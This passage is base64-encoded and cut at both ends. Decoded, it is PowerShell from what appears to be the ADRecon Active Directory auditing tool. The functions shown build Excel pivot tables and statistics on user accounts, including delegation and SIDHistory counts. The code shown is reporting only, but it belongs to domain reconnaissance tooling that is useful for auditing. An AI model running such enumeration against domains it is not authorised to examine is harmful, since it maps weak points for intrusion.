ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAiRXJyb3IhIgogICAgICAgIH0KICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgfQogICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJHRydWUKCiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJHdvcmtzaGVldAogICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAp9CgojIFRoYW5rcyBBbmFudCBTaHJpdmFzdGF2YSBmb3IgdGhlIHN1Z2dlc3Rpb24gb2YgdXNpbmcgUGl2b3QgVGFibGVzIGZvciBnZW5lcmF0aW9uIG9mIHRoZSBTdGF0cyBzaGVldHMuCkZ1bmN0aW9uIEdldC1BRFJFeGNlbFBpdm90VGFibGUKewo8IwouU1lOT1BTSVMKICAgIEhlbHBlciB0byBhZGQgUGl2b3QgVGFibGUgdG8gdGhlIGN1cnJlbnQgV29ya1NoZWV0LgoKLkRFU0NSSVBUSU9OCiAgICBIZWxwZXIgdG8gYWRkIFBpdm90IFRhYmxlIHRvIHRoZSBjdXJyZW50IFdvcmtTaGVldC4KCi5QQVJBTUVURVIgU3JjU2hlZXROYW1lCiAgICBbc3RyaW5nXQogICAgU291cmNlIFNoZWV0IE5hbWUuCgouUEFSQU1FVEVSIFBpdm90VGFibGVOYW1lCiAgICBbc3RyaW5nXQogICAgUGl2b3QgVGFibGUgTmFtZS4KCi5QQVJBTUVURVIgUGl2b3RSb3dzCiAgICBbYXJyYXldCiAgICBSb3cgbmFtZXMgZnJvbSBTb3VyY2UgU2hlZXQuCgouUEFSQU1FVEVSIFBpdm90Q29sdW1ucwogICAgW2FycmF5XQogICAgQ29sdW1uIG5hbWVzIGZyb20gU291cmNlIFNoZWV0LgoKLlBBUkFNRVRFUiBQaXZvdEZpbHRlcnMKICAgIFthcnJheV0KICAgIFJvdy9Db2x1bW4gbmFtZXMgZnJvbSBTb3VyY2UgU2hlZXQgdG8gdXNlIGFzIGZpbHRlcnMuCgouUEFSQU1FVEVSIFBpdm90VmFsdWVzCiAgICBbYXJyYXldCiAgICBSb3cvQ29sdW1uIG5hbWVzIGZyb20gU291cmNlIFNoZWV0IHRvIHVzZSBmb3IgVmFsdWVzLgoKLlBBUkFNRVRFUiBQaXZvdFBlcmNlbnRhZ2UKICAgIFthcnJheV0KICAgIFJvdy9Db2x1bW4gbmFtZXMgZnJvbSBTb3VyY2UgU2hlZXQgdG8gdXNlIGZvciBQZXJjZW50YWdlLgoKLlBBUkFNRVRFUiBQaXZvdExvY2F0aW9uCiAgICBbYXJyYXldCiAgICBMb2NhdGlvbiBvZiB0aGUgUGl2b3QgVGFibGUgaW4gUm93L0NvbHVtbi4KIz4KICAgIHBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkU3JjU2hlZXROYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUGl2b3RUYWJsZU5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbYXJyYXldICRQaXZvdFJvd3MsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbYXJyYXldICRQaXZvdENvbHVtbnMsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbYXJyYXldICRQaXZvdEZpbHRlcnMsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbYXJyYXldICRQaXZvdFZhbHVlcywKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFthcnJheV0gJFBpdm90UGVyY2VudGFnZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtzdHJpbmddICRQaXZvdExvY2F0aW9uID0gIlIxQzEiCiAgICApCgogICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJGZhbHNlCiAgICAkU3JjV29ya3NoZWV0ID0gJHdvcmtib29rLlNoZWV0cy5JdGVtKCRTcmNTaGVldE5hbWUpCiAgICAkd29ya2Jvb2suU2hvd1Bpdm90VGFibGVGaWVsZExpc3QgPSAkZmFsc2UKCiAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL3ZiYS9leGNlbC12YmEvYXJ0aWNsZXMveGxwaXZvdHRhYmxlc291cmNldHlwZS1lbnVtZXJhdGlvbi1leGNlbAogICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy92YmEvZXhjZWwtdmJhL2FydGljbGVzL3hscGl2b3R0YWJsZXZlcnNpb25saXN0LWVudW1lcmF0aW9uLWV4Y2VsCiAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL3ZiYS9leGNlbC12YmEvYXJ0aWNsZXMveGxwaXZvdGZpZWxkb3JpZW50YXRpb24tZW51bWVyYXRpb24tZXhjZWwKICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvdmJhL2V4Y2VsLXZiYS9hcnRpY2xlcy9jb25zdGFudHMtZW51bWVyYXRpb24tZXhjZWwKICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvdmJhL2V4Y2VsLXZiYS9hcnRpY2xlcy94bHNvcnRvcmRlci1lbnVtZXJhdGlvbi1leGNlbAogICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy92YmEvZXhjZWwtdmJhL2FydGljbGVzL3hscGl2b3RmaWx0ZXJ0eXBlLWVudW1lcmF0aW9uLWV4Y2VsCgogICAgIyB4bERhdGFiYXNlID0gMSAjIHRoaXMganVzdCBtZWFucyBsb2NhbCBzaGVldCBkYXRhCiAgICAjIHhsUGl2b3RUYWJsZVZlcnNpb24xMiA9IDMgIyBFeGNlbCAyMDA3CiAgICAkUGl2b3RGYWlsZWQgPSAkZmFsc2UKICAgIFRyeQogICAgewogICAgICAgICRQaXZvdENhY2hlcyA9ICR3b3JrYm9vay5QaXZvdENhY2hlcygpLkNyZWF0ZShbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsUGl2b3RUYWJsZVNvdXJjZVR5cGVdOjp4bERhdGFiYXNlLCAkU3JjV29ya3NoZWV0LlVzZWRSYW5nZSwgW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90VGFibGVWZXJzaW9uTGlzdF06OnhsUGl2b3RUYWJsZVZlcnNpb24xMikKICAgIH0KICAgIENhdGNoCiAgICB7CiAgICAgICAgJFBpdm90RmFpbGVkID0gJHRydWUKICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgIH0KICAgIElmICggJFBpdm90RmFpbGVkIC1lcSAkdHJ1ZSApCiAgICB7CiAgICAgICAgJHJvd3MgPSAkU3JjV29ya3NoZWV0LlVzZWRSYW5nZS5Sb3dzLkNvdW50CiAgICAgICAgSWYgKCRTcmNTaGVldE5hbWUgLWVxICJDb21wdXRlciBTUE5zIikKICAgICAgICB7CiAgICAgICAgICAgICRQaXZvdENvbHMgPSAiQTE6QiIKICAgICAgICB9CiAgICAgICAgRWxzZUlmICgkU3JjU2hlZXROYW1lIC1lcSAiVXNlcnMiKQogICAgICAgIHsKICAgICAgICAgICAgJFBpdm90Q29scyA9ICJBMTpBSSIKICAgICAgICB9CiAgICAgICAgJFVzZWRSYW5nZSA9ICRTcmNXb3Jrc2hlZXQuUmFuZ2UoJFBpdm90Q29scyskcm93cykKICAgICAgICAkUGl2b3RDYWNoZXMgPSAkd29ya2Jvb2suUGl2b3RDYWNoZXMoKS5DcmVhdGUoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90VGFibGVTb3VyY2VUeXBlXTo6eGxEYXRhYmFzZSwgJFVzZWRSYW5nZSwgW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90VGFibGVWZXJzaW9uTGlzdF06OnhsUGl2b3RUYWJsZVZlcnNpb24xMikKICAgICAgICBSZW1vdmUtVmFyaWFibGUgcm93cwoJUmVtb3ZlLVZhcmlhYmxlIFBpdm90Q29scwogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBVc2VkUmFuZ2UKICAgIH0KICAgIFJlbW92ZS1WYXJpYWJsZSBQaXZvdEZhaWxlZAogICAgJFBpdm90VGFibGUgPSAkUGl2b3RDYWNoZXMuQ3JlYXRlUGl2b3RUYWJsZSgkUGl2b3RMb2NhdGlvbiwkUGl2b3RUYWJsZU5hbWUpCiAgICAjICR3b3JrYm9vay5TaG93UGl2b3RUYWJsZUZpZWxkTGlzdCA9ICR0cnVlCgogICAgSWYgKCRQaXZvdFJvd3MpCiAgICB7CiAgICAgICAgRm9yRWFjaCAoJFJvdyBpbiAkUGl2b3RSb3dzKQogICAgICAgIHsKICAgICAgICAgICAgJFBpdm90RmllbGQgPSAkUGl2b3RUYWJsZS5QaXZvdEZpZWxkcygkUm93KQogICAgICAgICAgICAkUGl2b3RGaWVsZC5PcmllbnRhdGlvbiA9IFtNaWNyb3NvZnQuT2ZmaWNlLkludGVyb3AuRXhjZWwuWGxQaXZvdEZpZWxkT3JpZW50YXRpb25dOjp4bFJvd0ZpZWxkCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUGl2b3RDb2x1bW5zKQogICAgewogICAgICAgIEZvckVhY2ggKCRDb2wgaW4gJFBpdm90Q29sdW1ucykKICAgICAgICB7CiAgICAgICAgICAgICRQaXZvdEZpZWxkID0gJFBpdm90VGFibGUuUGl2b3RGaWVsZHMoJENvbCkKICAgICAgICAgICAgJFBpdm90RmllbGQuT3JpZW50YXRpb24gPSBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsUGl2b3RGaWVsZE9yaWVudGF0aW9uXTo6eGxDb2x1bW5GaWVsZAogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFBpdm90RmlsdGVycykKICAgIHsKICAgICAgICBGb3JFYWNoICgkRmlsIGluICRQaXZvdEZpbHRlcnMpCiAgICAgICAgewogICAgICAgICAgICAkUGl2b3RGaWVsZCA9ICRQaXZvdFRhYmxlLlBpdm90RmllbGRzKCRGaWwpCiAgICAgICAgICAgICRQaXZvdEZpZWxkLk9yaWVudGF0aW9uID0gW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90RmllbGRPcmllbnRhdGlvbl06OnhsUGFnZUZpZWxkCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUGl2b3RWYWx1ZXMpCiAgICB7CiAgICAgICAgRm9yRWFjaCAoJFZhbCBpbiAkUGl2b3RWYWx1ZXMpCiAgICAgICAgewogICAgICAgICAgICAkUGl2b3RGaWVsZCA9ICRQaXZvdFRhYmxlLlBpdm90RmllbGRzKCRWYWwpCiAgICAgICAgICAgICRQaXZvdEZpZWxkLk9yaWVudGF0aW9uID0gW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90RmllbGRPcmllbnRhdGlvbl06OnhsRGF0YUZpZWxkCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUGl2b3RQZXJjZW50YWdlKQogICAgewogICAgICAgIEZvckVhY2ggKCRWYWwgaW4gJFBpdm90UGVyY2VudGFnZSkKICAgICAgICB7CiAgICAgICAgICAgICRQaXZvdEZpZWxkID0gJFBpdm90VGFibGUuUGl2b3RGaWVsZHMoJFZhbCkKICAgICAgICAgICAgJFBpdm90RmllbGQuT3JpZW50YXRpb24gPSBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsUGl2b3RGaWVsZE9yaWVudGF0aW9uXTo6eGxEYXRhRmllbGQKICAgICAgICAgICAgJFBpdm90RmllbGQuQ2FsY3VsYXRpb24gPSBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsUGl2b3RGaWVsZENhbGN1bGF0aW9uXTo6eGxQZXJjZW50T2ZUb3RhbAogICAgICAgICAgICAkUGl2b3RUYWJsZS5TaG93VmFsdWVzUm93ID0gJGZhbHNlCiAgICAgICAgfQogICAgfQoKICAgICMgJFBpdm90RmllbGRzLkNhcHRpb24gPSAiIgogICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJHRydWUKCiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJFBpdm90RmllbGQKICAgIFJlbW92ZS1WYXJpYWJsZSBQaXZvdEZpZWxkCiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJFBpdm90VGFibGUKICAgIFJlbW92ZS1WYXJpYWJsZSBQaXZvdFRhYmxlCiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJFBpdm90Q2FjaGVzCiAgICBSZW1vdmUtVmFyaWFibGUgUGl2b3RDYWNoZXMKICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkU3JjV29ya3NoZWV0CiAgICBSZW1vdmUtVmFyaWFibGUgU3JjV29ya3NoZWV0Cn0KCkZ1bmN0aW9uIEdldC1BRFJFeGNlbEF0dHJpYnV0ZVN0YXRzCnsKPCMKLlNZTk9QU0lTCiAgICBIZWxwZXIgdG8gYWRkIEF0dHJpYnV0ZSBTdGF0cyB0byB0aGUgY3VycmVudCBXb3JrU2hlZXQuCgouREVTQ1JJUFRJT04KICAgIEhlbHBlciB0byBhZGQgQXR0cmlidXRlIFN0YXRzIHRvIHRoZSBjdXJyZW50IFdvcmtTaGVldC4KCi5QQVJBTUVURVIgU3JjU2hlZXROYW1lCiAgICBbc3RyaW5nXQogICAgU291cmNlIFNoZWV0IE5hbWUuCgouUEFSQU1FVEVSIFRpdGxlMQogICAgW3N0cmluZ10KICAgIFRpdGxlMS4KCi5QQVJBTUVURVIgVGl0bGUyCiAgICBbc3RyaW5nXQogICAgVGl0bGUyLgoKLlBBUkFNRVRFUiBPYmpBdHRyaWJ1dGVzCiAgICBbT3JkZXJlZERpY3Rpb25hcnldCiAgICBBdHRyaWJ1dGVzLgojPgogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRTcmNTaGVldE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRUaXRsZTEsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRUaXRsZTIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XSAkT2JqQXR0cmlidXRlcwogICAgKQoKICAgICRleGNlbC5TY3JlZW5VcGRhdGluZyA9ICRmYWxzZQogICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKICAgICRTcmNXb3Jrc2hlZXQgPSAkd29ya2Jvb2suU2hlZXRzLkl0ZW0oJFNyY1NoZWV0TmFtZSkKCiAgICAkcm93ID0gMQogICAgJGNvbHVtbiA9IDEKICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCAkY29sdW1uKSA9ICRUaXRsZTEKICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCRjb2x1bW4pLlN0eWxlID0gIkhlYWRpbmcgMiIKICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCRjb2x1bW4pLkhvcml6b250YWxBbGlnbm1lbnQgPSAtNDEwOAogICAgJE1lcmdlQ2VsbHMgPSAkd29ya3NoZWV0LlJhbmdlKCJBMTpDMSIpCiAgICAkTWVyZ2VDZWxscy5TZWxlY3QoKSB8IE91dC1OdWxsCiAgICAkTWVyZ2VDZWxscy5NZXJnZUNlbGxzID0gJHRydWUKICAgIFJlbW92ZS1WYXJpYWJsZSBNZXJnZUNlbGxzCgogICAgR2V0LUFEUkV4Y2VsUGl2b3RUYWJsZSAtU3JjU2hlZXROYW1lICRTcmNTaGVldE5hbWUgLVBpdm90VGFibGVOYW1lICJVc2VyIFN0YXR1cyIgLVBpdm90Um93cyBAKCJFbmFibGVkIikgLVBpdm90VmFsdWVzIEAoIlVzZXJOYW1lIikgLVBpdm90UGVyY2VudGFnZSBAKCJVc2VyTmFtZSIpIC1QaXZvdExvY2F0aW9uICJSMkMxIgogICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJGZhbHNlCgogICAgJHJvdyA9IDIKICAgICJUeXBlIiwiQ291bnQiLCJQZXJjZW50YWdlIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAkXwogICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCAkY29sdW1uKS5Gb250LkJvbGQgPSAkVHJ1ZQogICAgICAgICRjb2x1bW4rKwogICAgfQoKICAgICRyb3cgPSAzCiAgICAkY29sdW1uID0gMQogICAgRm9yKCRyb3cgPSAzOyAkcm93IC1sZSA2OyAkcm93KyspCiAgICB7CiAgICAgICAgJHRlbXB0ZXh0ID0gW3N0cmluZ10gJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4pLlRleHQKICAgICAgICBzd2l0Y2ggKCR0ZW1wdGV4dC5Ub1VwcGVyKCkpCiAgICAgICAgewogICAgICAgICAgICAiVFJVRSIgeyAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAiRW5hYmxlZCIgfQogICAgICAgICAgICAiRkFMU0UiIHsgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4pID0gIkRpc2FibGVkIiB9CiAgICAgICAgICAgICJHUkFORCBUT1RBTCIgeyAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAiVG90YWwiIH0KICAgICAgICB9CiAgICB9CgogICAgJHJvdyA9IDEKICAgICRjb2x1bW4gPSA2CiAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAkVGl0bGUyCiAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywkY29sdW1uKS5TdHlsZSA9ICJIZWFkaW5nIDIiCiAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywkY29sdW1uKS5Ib3Jpem9udGFsQWxpZ25tZW50ID0gLTQxMDgKICAgICRNZXJnZUNlbGxzID0gJHdvcmtzaGVldC5SYW5nZSgiRjE6TDEiKQogICAgJE1lcmdlQ2VsbHMuU2VsZWN0KCkgfCBPdXQtTnVsbAogICAgJE1lcmdlQ2VsbHMuTWVyZ2VDZWxscyA9ICR0cnVlCiAgICBSZW1vdmUtVmFyaWFibGUgTWVyZ2VDZWxscwoKICAgICRyb3crKwogICAgIkNhdGVnb3J5IiwiRW5hYmxlZCBDb3VudCIsIkVuYWJsZWQgUGVyY2VudGFnZSIsIkRpc2FibGVkIENvdW50IiwiRGlzYWJsZWQgUGVyY2VudGFnZSIsIlRvdGFsIENvdW50IiwiVG90YWwgUGVyY2VudGFnZSIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4pID0gJF8KICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikuRm9udC5Cb2xkID0gJFRydWUKICAgICAgICAkY29sdW1uKysKICAgIH0KCiAgICAkRXhjZWxDb2x1bW4gPSAoJFNyY1dvcmtzaGVldC5Db2x1bW5zLkZpbmQoIkVuYWJsZWQiKSkKICAgICRFbmFibGVkQ29sQWRkcmVzcyA9ICIkKCRFeGNlbENvbHVtbi5BZGRyZXNzKCRmYWxzZSwkZmFsc2UpLlN1YnN0cmluZygwLCRFeGNlbENvbHVtbi5BZGRyZXNzKCRmYWxzZSwkZmFsc2UpLkxlbmd0aC0xKSk6JCgkRXhjZWxDb2x1bW4uQWRkcmVzcygkZmFsc2UsJGZhbHNlKS5TdWJzdHJpbmcoMCwkRXhjZWxDb2x1bW4uQWRkcmVzcygkZmFsc2UsJGZhbHNlKS5MZW5ndGgtMSkpIgoKICAgICRjb2x1bW4gPSA2CiAgICAkaSA9IDIKCiAgICAkT2JqQXR0cmlidXRlcy5rZXlzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRFeGNlbENvbHVtbiA9ICgkU3JjV29ya3NoZWV0LkNvbHVtbnMuRmluZCgkXykpCiAgICAgICAgJENvbEFkZHJlc3MgPSAiJCgkRXhjZWxDb2x1bW4uQWRkcmVzcygkZmFsc2UsJGZhbHNlKS5TdWJzdHJpbmcoMCwkRXhjZWxDb2x1bW4uQWRkcmVzcygkZmFsc2UsJGZhbHNlKS5MZW5ndGgtMSkpOiQoJEV4Y2VsQ29sdW1uLkFkZHJlc3MoJGZhbHNlLCRmYWxzZSkuU3Vic3RyaW5nKDAsJEV4Y2VsQ29sdW1uLkFkZHJlc3MoJGZhbHNlLCRmYWxzZSkuTGVuZ3RoLTEpKSIKICAgICAgICAkcm93KysKICAgICAgICAkaSsrCiAgICAgICAgSWYgKCRfIC1lcSAiRGVsZWdhdGlvbiBUeXAiKQogICAgICAgIHsKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4pID0gIlVuY29uc3RyYWluZWQgRGVsZWdhdGlvbiIKICAgICAgICB9CiAgICAgICAgRWxzZUlmICgkXyAtZXEgIkRlbGVnYXRpb24gVHlwZSIpCiAgICAgICAgewogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbikgPSAiQ29uc3RyYWluZWQgRGVsZWdhdGlvbiIKICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4pLkZvcm11bGEgPSAnPScgKyAkU3JjV29ya3NoZWV0Lk5hbWUgKyAnIScgKyAkRXhjZWxDb2x1bW4uQWRkcmVzcygkZmFsc2UsJGZhbHNlKQogICAgICAgIH0KICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbisxKS5Gb3JtdWxhID0gJz1DT1VOVElGUygnICsgJFNyY1dvcmtzaGVldC5OYW1lICsgJyEnICsgJEVuYWJsZWRDb2xBZGRyZXNzICsgJywiVFJVRSIsJyArICRTcmNXb3Jrc2hlZXQuTmFtZSArICchJyArICRDb2xBZGRyZXNzICsgJywnICsgJE9iakF0dHJpYnV0ZXNbJF9dICsgJyknCiAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4rMikuRm9ybXVsYSA9ICc9SUZFUlJPUihHJyArICRpICsgJy9WTE9PS1VQKCJFbmFibGVkIixBMzpCNiwyLEZBTFNFKSwwKScKICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbiszKS5Gb3JtdWxhID0gJz1DT1VOVElGUygnICsgJFNyY1dvcmtzaGVldC5OYW1lICsgJyEnICsgJEVuYWJsZWRDb2xBZGRyZXNzICsgJywiRkFMU0UiLCcgKyAkU3JjV29ya3NoZWV0Lk5hbWUgKyAnIScgKyAkQ29sQWRkcmVzcyArICcsJyArICRPYmpBdHRyaWJ1dGVzWyRfXSArICcpJwogICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgkcm93LCAkY29sdW1uKzQpLkZvcm11bGEgPSAnPUlGRVJST1IoSScgKyAkaSArICcvVkxPT0tVUCgiRGlzYWJsZWQiLEEzOkI2LDIsRkFMU0UpLDApJwogICAgICAgIElmICggKCRfIC1lcSAiU0lESGlzdG9yeSIpIC1vciAoJF8gLWVxICJtcy1kcy1DcmVhdG9yU2lkIikgKQogICAgICAgIHsKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKCRyb3csICRjb2x1bW4rNSkuRm9ybXVsYSA9ICc9Q09VTlRJRignICsgJFNyY1dvcmtzaGVldC5OYW1lICsgJyEnICsgJENvbEFkZHJlc3MgKyAnLCcgKyAkT2JqQXR0cmlidXRlc1skX10gKyAnKS0xJwogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbis1KS5Gb3JtdWxhID0gJz1DT1VOVElGKCcgKyAkU3JjV29ya3NoZWV0Lk5hbWUgKyAnIScgKyAkQ29sQWRkcmVzcyArICcsJyArICRPYmpBdHRyaWJ1dGVzWyRfXSArICcpJwogICAgICAgIH0KICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oJHJvdywgJGNvbHVtbis2KS5Gb3JtdWxhID0gJz1JRkVSUk9SKEsnICsgJGkgKyAnL1ZMT09LVVAoIlRvdGFsIixBMzpCNiwyLEZBTFNFKSwwKScKICAgIH0KCiAgICAjIGh0dHA6Ly93d3cuZXhjZWxob3d0by5jb20vbWFjcm9zL2Zvcm1hdHRpbmctYS1yYW5nZS1vZi1jZWxscy1pbi1leGNlbC12YmEvCiAgICAiSCIsICJKIiAsICJMIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkcm5nID0gJF8gKyAkKCRyb3cgLSAkT2JqQXR0cmlidXRlcy5Db3VudCArIDEpICsgIjoiICsgJF8gKyAkKCRyb3cpCiAgICAgICAgJHdvcmtzaGVldC5SYW5nZSgkcm5nKS5OdW1iZXJGb3JtYXQgPSAiMC4wMCUiCiAgICB9CiAgICAkZXhjZWwuU2NyZWVuVXBkYXRpbmcgPSAkdHJ1ZQoKICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkU3JjV29ya3NoZWV0CiAgICBSZW1vdmUtVmFyaWFibGUgU3JjV29ya3NoZWV0CiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJHdvcmtzaGVldAogICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAp9CgpGdW5jdGlvbiBHZXQtQURSRXhjZWxDaGFydAp7CjwjCi5TWU5PUFNJUwogICAgSGVscGVyIHRvIGFkZCBjaGFydHMgdG8gdGhlIGN1cnJlbnQgV29ya1NoZWV0LgoKLkRFU0NSSVBUSU9OCiAgICBIZWxwZXIgdG8gYWRkIGNoYXJ0cyB0byB0aGUgY3VycmVudCBXb3JrU2hlZXQuCgouUEFSQU1FVEVSIENoYXJ0VHlwZQogICAgW2ludF0KICAgIENoYXJ0IFR5cGUuCgouUEFSQU1FVEVSIENoYXJ0TGF5b3V0CiAgICBbaW50XQogICAgQ2hhcnQgTGF5b3V0LgoKLlBBUkFNRVRFUiBDaGFydFRpdGxlCiAgICBbc3RyaW5nXQogICAgVGl0bGUgb2YgdGhlIENoYXJ0LgoKLlBBUkFNRVRFUiBSYW5nZXRvQ292ZXIKICAgIFdvcmtTaGVldCBSYW5nZSB0byBiZSBjb3ZlcmVkIGJ5IHRoZSBDaGFydC4KCi5QQVJBTUVURVIgQ2hhcnREYXRhCiAgICBEYXRhIGZvciB0aGUgQ2hhcnQuCgouUEFSQU1FVEVSIFN0YXJ0Um93CiAgICBTdGFydCByb3cgdG8gY2FsY3VsYXRlIGRhdGEgZm9yIHRoZSBDaGFydC4KCi5QQVJBTUVURVIgU3RhcnRDb2x1bW4KICAgIFN0YXJ0IGNvbHVtbiB0byBjYWxjdWxhdGUgZGF0YSBmb3IgdGhlIENoYXJ0LgojPgogICAgcGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRDaGFydFR5cGUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRDaGFydExheW91dCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJENoYXJ0VGl0bGUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgICRSYW5nZXRvQ292ZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICAkQ2hhcnREYXRhID0gJG51bGwsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KI